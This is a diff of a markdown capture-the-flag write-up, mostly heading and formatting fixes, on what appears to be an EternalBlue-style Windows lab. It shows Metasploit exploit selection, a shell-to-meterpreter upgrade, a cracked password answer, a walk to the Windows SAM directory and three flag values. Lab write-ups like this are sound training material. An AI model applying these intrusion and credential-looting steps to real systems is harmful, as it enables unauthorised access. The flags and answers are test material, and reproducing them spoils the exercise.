@@ -64,7 +64,7 @@ Answer:
 - Next to select exploit enter :
 	use 0
 
-### Q3 :Use **show options** to learn what needs changing:
+### Q3: Use **show options** to learn what needs changing:
 	Answer: RHOSTS
 	
 Then enter the RHOST IP with:
@@ -108,9 +108,9 @@ Shows same as just typing 'sessions'
   msf post(multi/manage/shell_to_meterpreter) > sessions
 ```	
 	
-### Q4 Run meterpreter shell, no response required
+### Q4: Run meterpreter shell, no response required
 
-### Q5 just tells you to restart the target if it fails and it will likely fail several times.
+### Q5: just tells you to restart the target if it fails and it will likely fail several times.
 	
 Showed the following output: 
 ```
@@ -435,10 +435,10 @@ root@ip-10-66-120-76:~#
 Answer: alqfna22 
 
 
-# Task 5 Find flags:
+## Task 5 Find flags:
 Use meterpreter session 2 then use shell command to enter the command line of windows. Then find flag in user 'jon' directories:
 
-## Q1: Flag1 in root directory:
+### Q1: Flag1 in root directory:
 ```
 C:\>dir *.txt
 dir *.txt
@@ -459,54 +459,28 @@ flag{access_the_machine}
 C:\>
 ```
 
-## Q2: Flag2? This flag can be found at the location where passwords are stored within Windows.
+### Q2: Flag2? This flag can be found at the location where passwords are stored within Windows.
 ```
-C:\>cd Windows
-cd Windows
-
-C:\Windows>cd system32
-cd system32
-
-C:\Windows\System32>cd config
-cd config
-
+C:\>cd Windows\system32\config
+...
 C:\Windows\System32\config>dir
-dir
  Volume in drive C has no label.
  Volume Serial Number is E611-0B66
-
+...
  Directory of C:\Windows\System32\config
-
-03/27/2026  11:21 PM    <DIR>          .
-03/27/2026  11:21 PM    <DIR>          ..
-12/12/2018  06:00 PM            28,672 BCD-Template
-03/27/2026  11:29 PM        18,087,936 COMPONENTS
-03/27/2026  11:50 PM           262,144 DEFAULT
-03/17/2019  02:32 PM                34 flag2.txt
-07/13/2009  09:34 PM    <DIR>          Journal
-03/27/2026  11:50 PM    <DIR>          RegBack
-03/17/2019  03:05 PM           262,144 SAM
-03/27/2026  11:30 PM           262,144 SECURITY
-03/28/2026  12:30 AM        40,632,320 SOFTWARE
-03/28/2026  12:34 AM        12,320,768 SYSTEM
-11/20/2010  09:41 PM    <DIR>          systemprofile
-12/12/2018  06:03 PM    <DIR>          TxR
-               8 File(s)     71,856,162 bytes
-               6 Dir(s)  20,442,566,656 bytes free
+...
+ flag2.txt
+...
 
 C:\Windows\System32\config>type flag2.txt
-type flag2.txt
 flag{sam_database_elevated_access}
 C:\Windows\System32\config>
 ```
 
-## Q: flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 
+### Q3: flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 
 ```
 C:\Users\Jon\Documents>dir
-dir
- Volume in drive C has no label.
- Volume Serial Number is E611-0B66
-
+...
  Directory of C:\Users\Jon\Documents
 
 12/12/2018  10:49 PM    <DIR>          .
@@ -515,8 +489,6 @@ dir
                1 File(s)             37 bytes
                2 Dir(s)  20,443,090,944 bytes free
 C:\Users\Jon\Documents>type flag3.txt
-type flag3.txt
 flag{admin_documents_can_be_valuable}
-C:\Users\Jon\Documents>
 ```
 
